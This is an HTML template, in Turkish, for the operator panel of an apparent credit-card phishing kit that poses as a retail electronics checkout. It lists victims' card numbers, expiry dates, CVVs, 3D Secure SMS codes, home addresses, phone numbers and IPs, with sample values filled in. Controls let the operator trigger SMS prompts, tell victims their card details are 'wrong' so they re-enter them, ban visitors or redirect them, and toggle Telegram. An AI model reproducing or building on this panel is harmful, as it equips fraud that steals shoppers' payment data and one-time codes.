<div class="content-wrapper">
    <div class="container-fluid">
      <!-- Breadcrumb-->
     <div class="row pt-2 pb-2">
        <div class="col-sm-9">
		    <h4 class="page-title">Data Tables</h4>
		    <ol class="breadcrumb">
            <li class="breadcrumb-item"><a href="javaScript:void();">Siparişler</a></li>
            <li class="breadcrumb-item"><a href="javaScript:void();">Kredi Kartı Siparişleri</a></li>
         </ol>
	   </div>
	   <div class="col-sm-3">
       <div class="btn-group float-sm-right">
        <button type="button" class="btn btn-light waves-effect waves-light"><i class="fa fa-cog mr-1"></i> Ayarlar</button>
        <button type="button" class="btn btn-light dropdown-toggle dropdown-toggle-split waves-effect waves-light" data-toggle="dropdown">
        <span class="caret"></span>
        </button>
        <div class="dropdown-menu">
          <a href="javaScript:void();" class="dropdown-item">Tümünü Sil</a>
          <a href="javaScript:void();" class="dropdown-item">Tümünü Banla</a>
          <a href="javaScript:void();" class="dropdown-item">Tümünü Anasayfa'ya Yönlendir</a>
          <div class="dropdown-divider"></div>
          <a href="javaScript:void();" class="dropdown-item">Telegram Aç/Kapa</a>
        </div>
      </div>
     </div>
     </div>

      <div class="row">
        <div class="col-lg-12">
          <div class="card">
            <div class="card-header"><i class="fa fa-table"></i> Kredi Kartları</div>
            <div class="card-body">
              <div class="table-responsive">
              <table id="example" class="table table-bordered">
                <thead>
                    <tr>
                        <th>Sıra</th>
                        <th>Adres Bilgileri</th>
                        <th>Kart Numarası</th>
                        <th>Kart SKT</th>
                        <th>Kart CVV</th>
                        <th>Banka Bilgileri</th>
                        <th>3D Kodu</th>
                        <th>Doğrulama</th>
                        <th>Tarih</th>
                        <th>Tutar</th>
                        <th>Aldığı Ürünler</th>
                        <th>İşlem</th>
                        <th>Durum</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>1</td>
                        <td ><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallsizemodal">Göster</button></td>
                        <td>4543 6047 8787 9898</td>
                        <td>07/25</td>
                        <td>784</td>
                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smalllsizemodal">Göster</button></td>
                        <td style="color: green">787887</td>
                        <td style="color: green">545454</td>
                        <td>23/12/2023 12:53:05</td>
                        <td>10500 ₺</td>
                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallllsizemodal">Göster</button></td>
                        <td>
                              <select id="select-area" data-id="1">
                                    <option>Seç</option>
                                    <option value="ban">Banla</option>
                                    <option value="delete">Logu sil</option>
                                    <option value="3dsecure">SMS Gönder</option>
                                    <option value="tebrik">Tebrikle</option>
                                    <option value="hatali">Hatalıya Gönder</option>
                                    <option value="dogrulama">Dogrulama</option>
                                    <option value="ccno_error">CCNO Hatalı</option>
                                    <option value="skt_error">SKT Hatalı</option>
                                    <option value="cvv_error">CVV Hatalı</option>
                                    <option value="bekle">Bekle</option>
                                    <option value="closed_card">Kart Kapalı</option>
                                    <option value="red_card">Hata Ver</option>
                                    <option value="phone_error">Telefon Hatalı</option>
                                </select>
                   
                        </td>
                        <td style="color: green">İşlemi Bitirdi</td>

                    </tr>
                </tbody>
                <tfoot>
                    <tr>
                        <th>Sıra</th>
                        <th>Adres Bilgileri</th>
                        <th>Kart Numarası</th>
                        <th>Kart SKT</th>
                        <th>Kart CVV</th>
                        <th>Banka Bilgileri</th>
                        <th>3D Kodu</th>
                        <th>Doğrulama</th>
                        <th>Tarih</th>
                        <th>Tutar</th>
                        <th>Aldığı Ürünler</th>
                        <th>İşlem</th>
                        <th>Durum</th>
                    </tr>
                </tfoot>
            </table>
            <div class="modal fade" id="smallsizemodal" style="display: none;" aria-hidden="true">
                  <div class="modal-dialog modal-lg">
                    <div class="modal-content">
                      <div class="modal-header">
                        <h5 class="modal-title">Adres Bilgileri</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                          <span aria-hidden="true">×</span>
                        </button>
                      </div>
                      <div class="modal-body">
                        <div class="row">
                            <div class="col-lg-12">
                            <div class="card">
                                <div class="card-body">
                                <h5 class="card-title">Adres Bilgileri</h5>
                                <div class="table-responsive">
                                <table class="table table-hover">
                                    <thead>
                                    <tr>
                                        <th scope="col">Ad Soyad</th>
                                        <th scope="col">İl</th>
                                        <th scope="col">İlçe</th>
                                        <th scope="col">Mahalle</th>
                                        <th scope="col">Bina No</th>
                                        <th scope="col">Kat No</th>
                                        <th scope="col">Daire No</th>
                                        <th scope="col">Adres Tarifi</th>
                                        <th scope="col">Adres İsmi</th>
                                        <th scope="col">Telefon</th>
                                        <th scope="col">IP</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    <tr>
                                        <td>Ahmet Yılmaz</td>
                                        <td>İstanbul</td>
                                        <td>Beşiktaş</td>
                                        <td>Moda</td>
                                        <td>1</td>
                                        <td>1</td>
                                        <td>1</td>
                                        <td>Yok</td>
                                        <td>Ev</td>
                                        <td>+905324847878</td>
                                        <td>88.252.74.17</td>
                                    </tr>
                                    </tbody>
                                </table>
                                </div>
                                </div>
                            </div>
                            </div>
                        </div>
                      </div>
                      <div class="modal-footer">
                        <button type="button" class="btn btn-white btn-sm" data-dismiss="modal"><i class="fa fa-times"></i> Kapat</button>
                        <button type="button" class="btn btn-primary btn-sm"><i class="fa fa-check-square-o"></i> Güncelle</button>
                      </div>
                    </div>
                  </div>
            </div>
            <div class="modal fade" id="smalllsizemodal" style="display: none;" aria-hidden="true">
                  <div class="modal-dialog modal-lg">
                    <div class="modal-content">
                      <div class="modal-header">
                        <h5 class="modal-title">Banka Bilgileri</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                          <span aria-hidden="true">×</span>
                        </button>
                      </div>
                      <div class="modal-body">
                        <div class="row">
                            <div class="col-lg-12">
                            <div class="card">
                                <div class="card-body">
                                <h5 class="card-title">Banka Bilgileri</h5>
                                <div class="table-responsive">
                                <table class="table table-hover">
                                    <thead>
                                    <tr>
                                        <th scope="col">Banka Adı</th>
                                        <th scope="col">Banka Numarası</th>
                                        <th scope="col">Kart Tipi</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    <tr>
                                        <td>İş Bankası</td>
                                        <td>+902124545454</td>
                                        <td>VISA</td>
                                    </tr>
                                    </tbody>
                                </table>
                                </div>
                                </div>
                            </div>
                            </div>
                        </div>
                      </div>
                      <div class="modal-footer">
                        <button type="button" class="btn btn-white btn-sm" data-dismiss="modal"><i class="fa fa-times"></i> Kapat</button>
                        <button type="button" class="btn btn-primary btn-sm"><i class="fa fa-check-square-o"></i> Güncelle</button>
                      </div>
                    </div>
                  </div>
            </div>
            <div class="modal fade" id="smallllsizemodal" style="display: none;" aria-hidden="true">
                  <div class="modal-dialog">
                    <div class="modal-content border-0">
                        <div class="card mb-0">
                            <div id="carousel-2" class="carousel slide" data-ride="carousel">
                              <ol class="carousel-indicators">
                                <li data-target="#carousel-2" data-slide-to="0" class="active"></li>
                                <li data-target="#carousel-2" data-slide-to="1" class=""></li>
                                <li data-target="#carousel-2" data-slide-to="2" class=""></li>
                              </ol>
                              <div class="carousel-inner">
                                <div class="carousel-item active">
                                  <img class="d-block w-100 card-img-top" src="https://images.migrosone.com/elektronik/product/39401915/39401915-4af3e9-1650x1650.png" alt="Card image cap">
                                </div>
                                <div class="carousel-item">
                                  <img class="d-block w-100 card-img-top" src="https://images.migrosone.com/elektronik/product/39184344/39184344-0fc37c-1650x1650.jpg" alt="Card image cap">
                                </div>
                                <div class="carousel-item">
                                  <img class="d-block w-100 card-img-top" src="https://images.migrosone.com/elektronik/product/39398277/39398277-4d4367-1650x1650.jpg" alt="Card image cap">
                                </div>
                              </div>
                              <a class="carousel-control-prev" href="#carousel-2" role="button" data-slide="prev">
                                <span class="carousel-control-prev-icon" aria-hidden="true"></span>
                                <span class="sr-only">Geri</span>
                              </a>
                              <a class="carousel-control-next" href="#carousel-2" role="button" data-slide="next">
                                <span class="carousel-control-next-icon" aria-hidden="true"></span>
                                <span class="sr-only">İleri</span>
                              </a>
                            </div>
                            <div class="card-body">
                              <h5 class="card-title text-dark">Aldığı Ürünler</h5>
                              <p class="card-text">Some quick example text to build on the card title and make up the bulk of the card's content.</p>
                            </div>
                             <ul class="list-group list-group-flush list shadow-none">
                              <li class="list-group-item d-flex justify-content-between align-items-center"> Toshiba 50UL3C63DT/2 126 Ekran UHD Uydu Smart Led Tv  <span class="badge badge-dark">1</span></li>
                              <li class="list-group-item d-flex justify-content-between align-items-center"> Samsung Watch6 Sm-r940nzsatur Silver (44Mm)  <span class="badge badge-success">1</span></li>
                              <li class="list-group-item d-flex justify-content-between align-items-center"> Rampage Kb-r22 Letho Multımedıa Raınbow Gaming Klavye <span class="badge badge-danger">1</span></li>
                            </ul>
                          </div>
                      
                    </div>
                  </div>
            </div>
            </div>
            </div>
          </div>
        </div>
      </div><!-- End Row-->
<!--start overlay-->
	  <div class="overlay toggle-menu"></div>
	<!--end overlay-->
    </div>
    <!-- End container-fluid-->
    
    </div>